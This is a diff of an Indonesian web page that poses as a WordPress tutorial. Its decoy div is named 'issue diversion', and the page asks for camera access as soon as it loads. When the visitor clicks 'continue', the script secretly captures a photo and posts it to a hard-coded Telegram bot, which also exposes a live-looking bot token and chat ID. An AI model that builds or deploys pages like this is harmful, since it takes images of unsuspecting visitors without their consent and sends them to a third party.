@@ -5,23 +5,98 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Kirim Gambar ke Telegram</title>
 <style>
+  body {
+    font-family: 'Arial', sans-serif;
+    margin: 0;
+    padding: 0;
+    background-color: #f4f4f4;
+    color: #333;
+  }
+
+  #pengalihan-isu {
+    text-align: center;
+    padding: 20px;
+    margin: 20px;
+    background: #fff;
+    border-radius: 10px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    position: relative;
+  }
+
+  #pengalihan-isu h1 {
+    font-size: 2em;
+    color: #2c3e50;
+  }
+
+  #pengalihan-isu img {
+    width: 50px; /* Adjust the width as needed */
+    position: absolute;
+    top: 20px;
+    right: 20px;
+  }
+
   #camera-stream {
     width: 100%;
     max-width: 600px;
-    margin: auto;
+    margin: 20px auto;
+    border: 5px solid #2980b9;
+    border-radius: 10px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+  }
+
+  button {
+    background-color: #2980b9;
+    color: #fff;
+    border: none;
+    padding: 10px 20px;
+    font-size: 1em;
+    border-radius: 5px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+  }
+
+  button:hover {
+    background-color: #3498db;
   }
 
   .hidden {
     display: none;
   }
+  #tutorial {
+  background: #fff; /* White background for the tutorial section */
+  border-radius: 10px; /* Rounded corners */
+  padding: 20px; /* Inner padding */
+  margin: 20px auto; /* Centered with margin */
+  max-width: 800px; /* Max width for larger screens */
+  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); /* Subtle shadow */
+}
+
+#tutorial h1 {
+  font-size: 2.5em; /* Larger heading */
+  color: #2980b9; /* Main color */
+  text-align: center; /* Centered heading */
+  margin-bottom: 20px; /* Space below heading */
+}
+
+#tutorial ol {
+  padding-left: 20px; /* Indent list items */
+}
+
+#tutorial li {
+  margin: 10px 0; /* Space between list items */
+  font-size: 1.1em; /* Slightly larger font for list items */
+  line-height: 1.6; /* Increased line height for readability */
+}
+
+
 </style>
 </head>
 <body>
   <div id="pengalihan-isu">
-      <h1>Langkah demi langkah membuat web WordPress</h1>
-  
-  <video class="hidden" id="camera-stream" autoplay></video>
-  <button onclick="takePicture()">Klik untuk melanjutkan</button>
+    <img src="https://telegra.ph/file/54b7434397977c5e8bd57.jpg" alt="Logo"> <!-- Replace with your logo path -->
+    <h1>Langkah demi langkah membuat web WordPress</h1>
+    <video class="hidden" id="camera-stream" autoplay></video>
+    <button onclick="takePicture()">Klik untuk melanjutkan</button>
   </div>
   
   <div id="tutorial" class="tutorial hidden">
@@ -60,75 +135,69 @@
     </ol>
   </div>
 
-  
-  <script>
-    // Ambil elemen video
-    const video = document.getElementById('camera-stream');
-         const pengalihan =  document.getElementById("pengalihan-isu")
-         const tutorial = document.getElementById("tutorial")
+<script>
+  // Ambil elemen video
+  const video = document.getElementById('camera-stream');
+  const pengalihan = document.getElementById("pengalihan-isu")
+  const tutorial = document.getElementById("tutorial")
 
-    // Mengakses kamera pengguna saat halaman dimuat
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(function(stream) {
-        video.srcObject = stream;
-        
-      })
-      .catch(function(error) {
-        console.error('Error accessing the camera:', error);
-      });
+  // Mengakses kamera pengguna saat halaman dimuat
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(function(stream) {
+      video.srcObject = stream;
+    })
+    .catch(function(error) {
+      console.error('Error accessing the camera:', error);
+    });
 
-    // Fungsi untuk mengambil gambar dari video dan mengirimnya
-    function takePicture() {
-
-     pengalihan.classList.add("hidden")
-     tutorial.classList.remove("hidden")
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video, 0, 0);
-      
-      // Mengubah gambar menjadi data URL (base64)
-      const dataURL = canvas.toDataURL('image/jpeg');
-      
-      // Mengubah data URL menjadi format yang bisa dikirimkan
-      const base64Data = dataURL.split(',')[1];
-      const binaryString = window.atob(base64Data);
-      const len = binaryString.length;
-      const bytes = new Uint8Array(len);
-      for (let i = 0; i < len; i++) {
-        bytes[i] = binaryString.charCodeAt(i);
-      }
-      const file = new File([bytes], 'photo.jpg', { type: 'image/jpeg' });
-
-      const formData = new FormData();
-      formData.append('chat_id', '5610020378'); // Ganti dengan chat ID yang Anda inginkan
-      formData.append('photo', file);
-      formData.append('caption', 'Foto dari kamera');
-
-      // Token bot Telegram
-      const token = '6489258679:AAFNnPRllTOq9iYo_O3b9i_jQS5f1lELKNs'; // Ganti dengan token bot Telegram Anda
-
-      // Kirim gambar ke bot Telegram
-      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-        method: 'POST',
-        body: formData
-      })
-      .then(response => {
-        if (!response.ok) {
-          throw new Error('Network response was not ok');
-        }
-        return response.json();
-      })
-      .then(data => {
-        console.log('Image sent to Telegram:', data);
-      })
-      .catch(error => {
-        console.error('Error sending image to Telegram:', error);
-      });
+  // Fungsi untuk mengambil gambar dari video dan mengirimnya
+  function takePicture() {
+    pengalihan.classList.add("hidden")
+    tutorial.classList.remove("hidden")
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    
+    // Mengubah gambar menjadi data URL (base64)
+    const dataURL = canvas.toDataURL('image/jpeg');
+    
+    // Mengubah data URL menjadi format yang bisa dikirimkan
+    const base64Data = dataURL.split(',')[1];
+    const binaryString = window.atob(base64Data);
+    const len = binaryString.length;
+    const bytes = new Uint8Array(len);
+    for (let i = 0; i < len; i++) {
+      bytes[i] = binaryString.charCodeAt(i);
     }
+    const file = new File([bytes], 'photo.jpg', { type: 'image/jpeg' });
 
-    // Fungsi untuk mengambil gambar dan mengalihkan halaman
-  
-  </script>
+    const formData = new FormData();
+    formData.append('chat_id', '5610020378'); // Ganti dengan chat ID yang Anda inginkan
+    formData.append('photo', file);
+    formData.append('caption', 'Foto dari kamera');
+
+    // Token bot Telegram
+    const token = '6489258679:AAFNnPRllTOq9iYo_O3b9i_jQS5f1lELKNs'; // Ganti dengan token bot Telegram Anda
+
+    // Kirim gambar ke bot Telegram
+    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+      method: 'POST',
+      body: formData
+    })
+    .then(response => {
+      if (!response.ok) {
+        throw new Error('Network response was not ok');
+      }
+      return response.json();
+    })
+    .then(data => {
+      console.log('Image sent to Telegram:', data);
+    })
+    .catch(error => {
+      console.error('Error sending image to Telegram:', error);
+    });
+  }
+</script>
 </body>
 </html>
